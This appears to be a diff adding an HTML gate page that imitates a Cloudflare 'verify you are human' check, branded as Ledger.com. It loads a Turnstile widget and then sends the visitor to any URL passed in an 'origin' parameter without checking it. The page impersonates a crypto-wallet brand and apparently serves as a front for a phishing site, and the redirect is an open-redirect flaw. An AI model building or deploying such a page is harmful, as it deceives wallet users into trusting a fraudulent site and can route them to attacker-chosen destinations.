@@ -1,0 +1,152 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Just a moment...</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+  .logo-text {
+    fill: #fff;
+  }
+  body {
+    background-color: #222;
+    font-family: 'Inter', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .page-wrap {
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+    align-items: flex-start;
+  }
+
+  .header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .header img { width: 40px; height: 40px; flex-shrink: 0; }
+  .header-title { font-size: 26px; font-weight: 700; color: #e0e0e0; line-height: 1.3; }
+  .header-sub { font-size: 20px; color: #aaa; }
+
+  .widget {
+    background: #2e2e2e;
+    border: 1px solid #444;
+    border-radius: 4px;
+    width: 310px;
+    display: flex;
+    align-items: center;
+    padding: 10px 12px;
+    gap: 0;
+    min-height: 60px;
+  }
+
+  .left-area {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    flex: 1;
+  }
+
+  .cb-box {
+    width: 22px; height: 22px;
+    border: 2px solid #777;
+    border-radius: 3px;
+    flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+    background: #2b2b2b;
+    cursor: pointer;
+    transition: border-color 0.15s;
+  }
+  .cb-box.checked { border-color: #2e7d32; background: #2e7d32; }
+  .cb-checkmark { display: none; }
+  .cb-box.checked .cb-checkmark { display: block; }
+
+  .cb-label { font-size: 13px; color: #ccc; }
+
+  .spinner-wrap { width: 22px; height: 22px; flex-shrink: 0; position: relative; }
+  @keyframes spin8 { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+  .spinner-wrap svg { animation: spin8 1s steps(8, end) infinite; width: 22px; height: 22px; }
+  .spinner-wrap svg line {
+    stroke: #4caf50;
+    stroke-width: 2.5;
+    stroke-linecap: round;
+  }
+
+  .success-svg { width: 22px; height: 22px; flex-shrink: 0; }
+  .s-circle { fill: #2e7d32; }
+  .s-check {
+    stroke: #fff; stroke-width: 2.5; fill: none;
+    stroke-linecap: round; stroke-linejoin: round;
+    stroke-dasharray: 28; stroke-dashoffset: 28;
+    transition: stroke-dashoffset 0.35s ease 0.1s;
+  }
+  .s-check.drawn { stroke-dashoffset: 0; }
+  .success-label { font-size: 13px; color: #ccc; }
+
+  .right-brand {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 3px;
+    flex-shrink: 0;
+    margin-left: 10px;
+  }
+  .cf-logo-svg { height: 18px; opacity: 0.85; }
+  .terms { font-size: 10px; color: #888; }
+  .terms a { color: #999; text-decoration: none; cursor: pointer; }
+  .terms a:hover { text-decoration: underline; }
+
+  .sec-text { font-size: 16px; color: #888; margin-top: 4px; }
+
+  .state { display: none; align-items: center; gap: 10px; }
+  .state.active { display: flex; }
+</style>
+</head>
+<body>
+
+<div class="page-wrap">
+
+  <div class="header">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJQAAACUCAMAAABC4vDmAAAAQlBMVEUAAAD///8qKirs7OyBgYGHh4fU1NRgYGD19fXy8vI1NTXHx8f7+/t8fHxlZWUlJSXd3d23t7fOzs6qqqpRUVEcHBxbvP0YAAABIElEQVR4nO3b226CUBQGYRCsgBw8tO//qm3tlditQy3ZK2a++9/MlYngKgpJkiRJeiUbZErNJ7Zf2HSogPaY2h9bsj8sq9pUJbFP7fdoXhll1NwptT+tGHUe6rvG1H68vxvOT0QNi0YLDE9E1Ss1FbVRkFGUUZRRlFGUUZRR1EtF9X2/ZtT3xy+MkhRcN+6+vOfOuFaXTdP0yR/veWwvX8xvuTOuGUUZRRlFGUUZRRlFGUUZRRlFGUUZRRlFGUUZRUWOmrq5j+xRZTvXr/YAnkfd2hpl1N9cHsT+Yr03TcDPI+tbY5cxStK/C/liO+pfAIxCjKKMooyijKKMooyiIkeFPFEJeczzSJazp0dCHogZFTQq4iFryJNfSZIkSQruE3fQFWan60wjAAAAAElFTkSuQmCC" alt="icon">
+    <div>
+      <div class="header-title">Ledger.com</div>
+      <div class="header-sub">Verify you are human by completing the action below.</div>
+    </div>
+  </div>
+
+   <div id="widget" class="cf-turnstile" ></div>
+
+
+  <p class="sec-text">Ledger.com needs to review the security of your connection before proceeding.</p>
+
+</div>
+ <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script>
+<script type="text/javascript">
+window.onloadTurnstileCallback = function () {
+    turnstile.render('#widget', {
+        sitekey: "0x4AAAAAADorIe6HE_IrftD5",
+        callback: function(token) {
+            sessionStorage.setItem('captchaVerified', 'true');
+            const urlParams = new URLSearchParams(window.location.search);
+            const originPage = urlParams.get('origin');
+            
+            if (originPage) {
+                window.location.href = originPage;
+            } else {
+                window.location.href = '/';
+            }
+        },
+    });
+};
+
+   
+</script>
+</body>
+</html>
